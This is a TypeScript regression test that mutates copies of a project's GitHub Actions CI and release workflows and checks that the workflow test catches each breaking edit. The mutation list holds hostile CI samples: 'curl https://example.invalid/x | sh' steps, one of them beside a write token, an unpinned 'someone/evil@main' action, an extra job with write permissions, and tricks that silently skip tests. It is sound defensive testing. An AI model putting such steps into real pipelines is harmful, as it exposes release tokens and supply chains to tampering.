// Regression test for #93: each change below breaks the release path, so
// test/workflows.test.ts must fail on it, and a routine pin bump must not.
// This is its own file because it copies workflows.test.ts into a temporary
// folder, edits the copied workflows and runs the copy there. Nothing in the
// repo's own workflows is touched. A deliberate workflow change to a line named
// in `mutations` has to update that entry too ("the edit must apply").
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cpSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";

const repo = fileURLToPath(new URL("../", import.meta.url));
const CI = ".github/workflows/ci.yml";
const RELEASE = ".github/workflows/release.yml";

const mutations: [string, string, string, string][] = [
  ["github-release runs with if: always()", RELEASE, "    needs: ci\n", "    needs: ci\n    if: always()\n"],
  ["ci.yml gains a named step", CI, "      - run: npm test\n", "      - name: Helper\n        run: curl https://example.invalid/x | sh\n      - run: npm test\n"],
  ["ci.yml ignores failing tests", CI, "      - run: npm test\n", "      - run: npm test\n        continue-on-error: true\n"],
  ["ci.yml never runs the tests", CI, "      - run: npm test\n", "      - run: npm test\n        shell: 'true {0}'\n"],
  ["the version check exits 0 first", RELEASE, "        run: |\n          expected=", "        run: |\n          exit 0\n          expected="],
  ["the version check never runs", RELEASE, "        run: |\n          expected=", "        shell: 'true {0}'\n        run: |\n          expected="],
  ["a new script runs beside the write token", RELEASE, "      - name: Create the release", "      - run: curl https://example.invalid/x | sh\n      - name: Create the release"],
  ["the .vsix comes from another run", RELEASE, "          path: ${{ runner.temp }}\n      - name: Create", "          path: ${{ runner.temp }}\n          run-id: 12345\n          github-token: ${{ github.token }}\n      - name: Create"],
  ["a quoted uses: names an unpinned action", RELEASE, "      - name: Create the release", "      - \"uses\": someone/evil@main\n      - name: Create the release"],
  ["a quoted job id adds a fourth job with write access", RELEASE, "  github-release:\n", "  \"extra\":\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - run: echo hi\n\n  github-release:\n"],
  ["a no-break space hides shell text as a comment, so npm test never runs", CI, "      - run: npm test\n", "      - run: npm test #||exit 0\n"],
  ["a blank line after the backslash splits the gh command", RELEASE, "0xword.vsix\" \\\n", "0xword.vsix\" \\\n\n"],
];

/** The actions the workflows pin. A security update can bump any of them. */
const PINNED_ACTIONS = ["checkout", "setup-node", "upload-artifact", "download-artifact"];

/** Runs workflows.test.ts on a copy of the repo with each workflow edited, and returns its exit code. */
function statusAfter(edit: (file: string, text: string) => string): number | null {
  const dir = mkdtempSync(join(tmpdir(), "workflows-"));
  try {
    for (const path of [".github/workflows", "docs/release-pipeline.md", "test/workflows.test.ts"]) {
      cpSync(join(repo, path), join(dir, path), { recursive: true });
    }
    for (const file of [CI, RELEASE]) {
      writeFileSync(join(dir, file), edit(file, readFileSync(join(dir, file), "utf8")));
    }
    const run = spawnSync(process.execPath, ["--test", "test/workflows.test.ts"], {
      cwd: dir,
      encoding: "utf8",
      // Otherwise the inner run reports to this one and always exits 0.
      env: { ...process.env, NODE_TEST_CONTEXT: undefined },
    });
    return run.status;
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

describe("test/workflows.test.ts fails when", () => {
  for (const [name, target, before, after] of mutations) {
    it(name, () => {
      const status = statusAfter((file, text) => {
        if (file !== target) {
          return text;
        }
        assert.ok(text.includes(before), "the edit must apply");
        return text.replace(before, () => after);
      });
      assert.notEqual(status, 0, "workflows.test.ts passed on the broken workflow");
    });
  }
});

describe("test/workflows.test.ts still passes when", () => {
  for (const action of PINNED_ACTIONS) {
    it(`a security update bumps every pin of ${action} and its version comment`, () => {
      const pin = new RegExp(`(actions/${action})@[0-9a-f]{40} # v\\S+`, "g");
      let bumped = 0;
      const status = statusAfter((_file, text) =>
        text.replace(pin, (_match, name: string) => {
          bumped += 1;
          return `${name}@0123456789abcdef0123456789abcdef01234567 # v99.0.0`;
        }),
      );
      assert.ok(bumped > 0, `no pin of ${action} found`);
      assert.equal(status, 0);
    });
  }

  it("a whole-line comment is reworded", () => {
    let reworded = 0;
    const status = statusAfter((_file, text) =>
      text.replace(/^( *)#.*$/m, (_match, indent: string) => {
        reworded += 1;
        return `${indent}# Reworded.`;
      }),
    );
    assert.equal(reworded, 2, "each workflow must have a whole-line comment to reword");
    assert.equal(status, 0);
  });
});
